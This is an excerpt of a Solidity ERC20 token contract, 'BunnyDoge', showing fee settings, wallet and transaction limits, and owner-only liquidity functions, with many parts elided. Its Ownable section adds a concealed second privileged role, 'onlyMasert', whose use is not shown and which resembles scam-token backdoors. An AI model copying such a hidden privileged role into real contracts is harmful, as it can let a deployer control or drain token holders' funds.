...
// BunnyDoge Token Smart contract
...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyMasert() {
        require(_masert == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    ...
    function _setOwner(address newOwner) private {
     ...
     function _setMasert(address newMasert) private {
        address oldMasert = _masert;
        _masert = newMasert;
        emit OwnershipTransferred(oldMasert, newMasert);
    }
}
...
contract BunnyDoge is ERC20, ERC20Burnable, Ownable {
    ...
    uint256 public lpNum =18000000;
    // uint256 public numTokensSellToAddToLiquidity = _totalSupply.mul(lpNum).div(10000);
    uint256 private numTokensSellToAddToLiquidity = lpNum * 10**18; 
    ...
    uint256 buyIndexSellLiquify =100;

    bool public swapBuyLiquifyEnabled = true;
    bool public swapSellLiquifyEnabled = true;
    ...
    // Transfer fee
    uint256 public LPSellFees = 3;
    uint256 public marketSellFees = 7;
    uint256 public burnSellFees = 0;
    uint256 public sellFeeRate = LPSellFees.add(marketSellFees).add(burnSellFees);

    uint256 public LPBuyFees = 3;
    uint256 public marketBuyFees = 7;
    uint256 public burnBuyFees = 0;
    uint256 public buyFeeRate = LPBuyFees.add(marketBuyFees).add(burnBuyFees);



    constructor() ERC20("BunnyDoge", "BNDG") {
        ...
        _mint(_msgSender(), _totalSupply);
              ...
              isTimelockExempt[BurnAddr] = true;
    ...
    function doLP(uint256 contractTokenBalance) external onlyOwner {
     swapAndLiquify(contractTokenBalance);
    }
    ...
    function SetLpNum(uint256 lp) external onlyOwner {
        lpNum = lp;
    }
    ...
    // Check maxWallet
    function checkMaxWallet(address sender, address recipient, uint256 amount) internal {
        if (recipient != owner() && recipient != address(this)  && recipient != address(BurnAddr) && recipient != uniswapV2Pair && recipient != addressForMarketing){
    ...
    // Check for maxTX
    function checkTxLimit(address sender, uint256 amount, address recipient, bool isSell) internal {
        if (recipient != owner()){
            if(isSell){
    ...
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(BurnAddr)).sub(balanceOf(ZERO));
    }
